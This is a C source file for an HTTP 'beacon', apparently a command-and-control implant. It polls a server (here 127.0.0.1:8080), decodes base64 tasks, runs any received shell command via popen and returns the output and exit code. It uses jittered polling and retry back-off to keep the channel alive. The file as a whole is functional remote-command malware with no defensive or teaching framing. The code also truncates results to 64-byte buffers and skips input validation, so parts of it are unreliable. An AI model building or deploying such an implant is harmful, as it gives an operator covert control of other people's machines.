/*
 * beacon.c — C11 POSIX HTTP beacon
 *
 * Polls SERVER_HOST:SERVER_PORT via HTTP POST, receives base64-encoded tasks
 * (exec/sleep/exit), ships stdout+stderr+exit_code back, retries with
 * exponential back-off on network failures.
 *
 * Build:
 *   cc -std=c11 -Wall -Wextra -O2 -o beacon beacon.c
 * Run:
 *   ./beacon
 *
 * Protocol (both directions are JSON over HTTP/1.1):
 *   Beacon → Server  POST /beacon
 *     {"id":"<hostid>","stdout":"<b64>","stderr":"<b64>","exit":<n>}
 *     First check-in and post-sleep: stdout/stderr are "" and exit is -1.
 *
 *   Server → Beacon  200 OK body
 *     {"type":"wait"}
 *     {"type":"exec","arg":"<b64-encoded command>"}
 *     {"type":"sleep","arg":"<b64-encoded decimal seconds>"}
 *     {"type":"exit"}
 */

#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

/* ── tunables ───────────────────────────────────────────────────────────── */
#define SERVER_HOST   "127.0.0.1"
#define SERVER_PORT   "8080"
#define POLL_SEC      10          /* base polling interval in seconds       */
#define JITTER_SEC    3           /* ± random jitter added to POLL_SEC      */
#define BACKOFF_INIT  5           /* initial retry delay after a net error  */
#define BACKOFF_MAX   300         /* cap on exponential back-off (seconds)  */
#define HTTP_TIMEOUT  15          /* SO_RCVTIMEO / SO_SNDTIMEO in seconds   */
#define BUF_SZ        (1 << 17)   /* 128 KiB for HTTP request/response      */
#define PIPE_SZ       (1 << 16)   /* 64 KiB cap on popen output per stream  */

/* ── base64 ─────────────────────────────────────────────────────────────── */
static const char B64_ALPHA[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const unsigned char *src, size_t len)
{
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char  *out     = malloc(out_len);
    if (!out) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i + 2 < len; i += 3) {
        out[j++] = B64_ALPHA[(src[i]     >> 2) & 0x3F];
        out[j++] = B64_ALPHA[((src[i]    << 4) | (src[i+1] >> 4)) & 0x3F];
        out[j++] = B64_ALPHA[((src[i+1]  << 2) | (src[i+2] >> 6)) & 0x3F];
        out[j++] = B64_ALPHA[src[i+2]           & 0x3F];
    }
    if (i < len) {
        out[j++] = B64_ALPHA[(src[i] >> 2) & 0x3F];
        if (i + 1 < len) {
            out[j++] = B64_ALPHA[((src[i] << 4) | (src[i+1] >> 4)) & 0x3F];
            out[j++] = B64_ALPHA[(src[i+1] << 2) & 0x3F];
        } else {
            out[j++] = B64_ALPHA[(src[i] << 4) & 0x3F];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    out[j] = '\0';
    return out;
}

/* Returns newly-allocated decoded bytes; *out_len set to decoded length.
 * Returns NULL on error. The result is NUL-terminated for string safety. */
static unsigned char *b64_decode(const char *src, size_t *out_len)
{
    static const signed char DEC[256] = {
        ['+'] = 62, ['/'] = 63,
        ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,
        ['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,
        ['A']= 0,['B']= 1,['C']= 2,['D']= 3,['E']= 4,['F']= 5,
        ['G']= 6,['H']= 7,['I']= 8,['J']= 9,['K']=10,['L']=11,
        ['M']=12,['N']=13,['O']=14,['P']=15,['Q']=16,['R']=17,
        ['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,
        ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,
        ['m']=38,['n']=39,['o']=40,['p']=41,['q']=42,['r']=43,
        ['s']=44,['t']=45,['u']=46,['v']=47,['w']=48,['x']=49,
        ['y']=50,['z']=51,
        /* everything else stays 0, treated as invalid unless '=' */
    };

    size_t src_len = strlen(src);
    if (src_len % 4 != 0) return NULL;

    size_t approx = src_len / 4 * 3;
    unsigned char *out = malloc(approx + 1);
    if (!out) return NULL;

    size_t j = 0;
    for (size_t i = 0; i < src_len; i += 4) {
        unsigned char c0 = (unsigned char)src[i];
        unsigned char c1 = (unsigned char)src[i+1];
        unsigned char c2 = (unsigned char)src[i+2];
        unsigned char c3 = (unsigned char)src[i+3];

        int v0 = (c0 < 256) ? DEC[c0] : -1;
        int v1 = (c1 < 256) ? DEC[c1] : -1;

        out[j++] = (unsigned char)((v0 << 2) | (v1 >> 4));
        if (c2 != '=') {
            int v2 = DEC[(unsigned char)c2];
            out[j++] = (unsigned char)((v1 << 4) | (v2 >> 2));
            if (c3 != '=') {
                int v3 = DEC[(unsigned char)c3];
                out[j++] = (unsigned char)((v2 << 6) | v3);
            }
        }
    }
    out[j] = '\0';
    *out_len = j;
    return out;
}

/* ── minimal JSON field extractor ───────────────────────────────────────── */
/* Finds the value of a string-valued JSON key in a flat object.
 * Writes at most dst_sz-1 bytes to dst, NUL-terminates, returns 1 on success.
 * Does not handle nested objects or escaped quotes in values. */
static int json_get_str(const char *json, const char *key,
                        char *dst, size_t dst_sz)
{
    char needle[128];
    snprintf(needle, sizeof needle, "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ' ' || *p == '\t') p++;
    if (*p != ':') return 0;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return 0;
    p++;  /* skip opening quote */
    size_t i = 0;
    while (*p && *p != '"' && i < dst_sz - 1)
        dst[i++] = *p++;
    dst[i] = '\0';
    return (*p == '"') ? 1 : 0;
}

/* ── host id ─────────────────────────────────────────────────────────────── */
static void get_host_id(char *buf, size_t sz)
{
    if (gethostname(buf, sz) != 0)
        snprintf(buf, sz, "unknown");
    buf[sz - 1] = '\0';
    /* Replace characters that would break JSON */
    for (char *p = buf; *p; p++)
        if (*p == '"' || *p == '\\') *p = '_';
}

/* ── HTTP POST ───────────────────────────────────────────────────────────── */
/* Sends a POST to /beacon with body, writes the HTTP response body into
 * resp_buf (resp_sz bytes, NUL-terminated).  Returns 0 on success, -1 on
 * any network or protocol error. */
static int http_post(const char *body, char *resp_buf, size_t resp_sz)
{
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(SERVER_HOST, SERVER_PORT, &hints, &res) != 0)
        return -1;

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }

    /* Apply send/receive timeouts */
    struct timeval tv = { .tv_sec = HTTP_TIMEOUT, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);

    /* Build HTTP/1.1 request */
    size_t body_len = strlen(body);
    char *req = malloc(BUF_SZ);
    if (!req) { close(fd); return -1; }

    int req_len = snprintf(req, BUF_SZ,
        "POST /beacon HTTP/1.1\r\n"
        "Host: " SERVER_HOST ":" SERVER_PORT "\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        body_len, body);

    if (req_len <= 0 || (size_t)req_len >= BUF_SZ) {
        free(req); close(fd); return -1;
    }

    /* Send */
    ssize_t sent = 0, total = req_len;
    while (sent < total) {
        ssize_t n = write(fd, req + sent, (size_t)(total - sent));
        if (n <= 0) { free(req); close(fd); return -1; }
        sent += n;
    }
    free(req);

    /* Read full response */
    char *raw = malloc(BUF_SZ);
    if (!raw) { close(fd); return -1; }
    size_t raw_len = 0;
    for (;;) {
        ssize_t n = read(fd, raw + raw_len, BUF_SZ - raw_len - 1);
        if (n < 0) { free(raw); close(fd); return -1; }
        if (n == 0) break;
        raw_len += (size_t)n;
        if (raw_len >= BUF_SZ - 1) break;
    }
    close(fd);
    raw[raw_len] = '\0';

    /* Locate body after \r\n\r\n */
    char *body_start = strstr(raw, "\r\n\r\n");
    if (!body_start) { free(raw); return -1; }
    body_start += 4;

    /* Verify 200 OK */
    if (strncmp(raw, "HTTP/1.", 7) != 0 ||
        (strncmp(raw + 9, "200", 3) != 0)) {
        free(raw); return -1;
    }

    snprintf(resp_buf, resp_sz, "%s", body_start);
    free(raw);
    return 0;
}

/* ── execute a shell command via popen ──────────────────────────────────── */
/* Runs cmd, captures up to PIPE_SZ-1 bytes of stdout and stderr separately.
 * Caller frees *out and *err.  Returns the process exit code, or -1 on
 * failure to spawn. */
static int exec_cmd(const char *cmd,
                    char **out_buf, size_t *out_len,
                    char **err_buf, size_t *err_len)
{
    /* Redirect stderr to a temp file so popen only captures stdout */
    char tmp_path[] = "/tmp/beacon_err_XXXXXX";
    int  tmp_fd     = mkstemp(tmp_path);
    if (tmp_fd < 0) return -1;
    close(tmp_fd);

    /* Build "cmd 2>tmpfile" */
    size_t wrapped_sz = strlen(cmd) + strlen(tmp_path) + 8;
    char  *wrapped    = malloc(wrapped_sz);
    if (!wrapped) { unlink(tmp_path); return -1; }
    snprintf(wrapped, wrapped_sz, "%s 2>%s", cmd, tmp_path);

    /* Capture stdout */
    *out_buf = malloc(PIPE_SZ);
    *err_buf = malloc(PIPE_SZ);
    if (!*out_buf || !*err_buf) {
        free(*out_buf); free(*err_buf); free(wrapped);
        unlink(tmp_path); return -1;
    }

    FILE *fp = popen(wrapped, "r");
    free(wrapped);
    if (!fp) {
        free(*out_buf); free(*err_buf);
        unlink(tmp_path); return -1;
    }

    *out_len = fread(*out_buf, 1, PIPE_SZ - 1, fp);
    (*out_buf)[*out_len] = '\0';
    int status = pclose(fp);
    int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;

    /* Read stderr from temp file */
    FILE *ef = fopen(tmp_path, "r");
    if (ef) {
        *err_len = fread(*err_buf, 1, PIPE_SZ - 1, ef);
        fclose(ef);
    } else {
        *err_len = 0;
    }
    (*err_buf)[*err_len] = '\0';
    unlink(tmp_path);

    return exit_code;
}

/* ── main loop ───────────────────────────────────────────────────────────── */
int main(void)
{
    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    char host_id[256];
    get_host_id(host_id, sizeof host_id);

    char *resp    = malloc(BUF_SZ);
    char *body    = malloc(BUF_SZ);
    if (!resp || !body) { perror("malloc"); return 1; }

    /* State for initial check-in and task results */
    char  pending_stdout[64] = "";  /* base64 of last exec stdout */
    char  pending_stderr[64] = "";  /* base64 of last exec stderr */
    int   pending_exit       = -1;

    int backoff = BACKOFF_INIT;

    for (;;) {
        /* Build POST body */
        snprintf(body, BUF_SZ,
            "{\"id\":\"%s\",\"stdout\":\"%s\",\"stderr\":\"%s\",\"exit\":%d}",
            host_id, pending_stdout, pending_stderr, pending_exit);

        /* Clear pending result after including it */
        pending_stdout[0] = '\0';
        pending_stderr[0] = '\0';
        pending_exit      = -1;

        if (http_post(body, resp, BUF_SZ) < 0) {
            /* Network failure — back off and retry */
            fprintf(stderr, "[beacon] connection failed, retrying in %ds\n",
                    backoff);
            sleep((unsigned)backoff);
            backoff = backoff * 2 < BACKOFF_MAX ? backoff * 2 : BACKOFF_MAX;
            continue;
        }
        backoff = BACKOFF_INIT;  /* reset on success */

        /* Parse task type */
        char type[32] = "wait";
        json_get_str(resp, "type", type, sizeof type);

        if (strcmp(type, "wait") == 0) {
            /* nothing to do, fall through to sleep */

        } else if (strcmp(type, "exec") == 0) {
            char arg_b64[4096] = "";
            json_get_str(resp, "arg", arg_b64, sizeof arg_b64);

            size_t cmd_len = 0;
            unsigned char *cmd = b64_decode(arg_b64, &cmd_len);
            if (!cmd) {
                fprintf(stderr, "[beacon] bad exec arg base64\n");
                goto next_poll;
            }

            char *out = NULL, *err = NULL;
            size_t out_len = 0, err_len = 0;
            int rc = exec_cmd((char *)cmd, &out, &out_len, &err, &err_len);
            free(cmd);

            char *out_b64 = b64_encode((unsigned char *)out, out_len);
            char *err_b64 = b64_encode((unsigned char *)err, err_len);
            free(out); free(err);

            if (out_b64) {
                snprintf(pending_stdout, sizeof pending_stdout,
                         "%s", out_b64);
                free(out_b64);
            }
            if (err_b64) {
                snprintf(pending_stderr, sizeof pending_stderr,
                         "%s", err_b64);
                free(err_b64);
            }
            pending_exit = rc;

            /* Send result immediately on the next iteration — skip sleep */
            continue;

        } else if (strcmp(type, "sleep") == 0) {
            char arg_b64[64] = "";
            json_get_str(resp, "arg", arg_b64, sizeof arg_b64);

            size_t sec_len = 0;
            unsigned char *sec_str = b64_decode(arg_b64, &sec_len);
            long secs = sec_str ? strtol((char *)sec_str, NULL, 10) : 0;
            free(sec_str);

            if (secs > 0 && secs < 86400)
                sleep((unsigned)secs);
            goto next_poll;

        } else if (strcmp(type, "exit") == 0) {
            fprintf(stderr, "[beacon] received exit task, terminating\n");
            free(resp); free(body);
            return 0;
        }

    next_poll:;
        /* Jitter: sleep POLL_SEC ± JITTER_SEC */
        int jitter = (rand() % (2 * JITTER_SEC + 1)) - JITTER_SEC;
        int delay  = POLL_SEC + jitter;
        if (delay < 1) delay = 1;
        sleep((unsigned)delay);
    }

    free(resp);
    free(body);
    return 0;
}
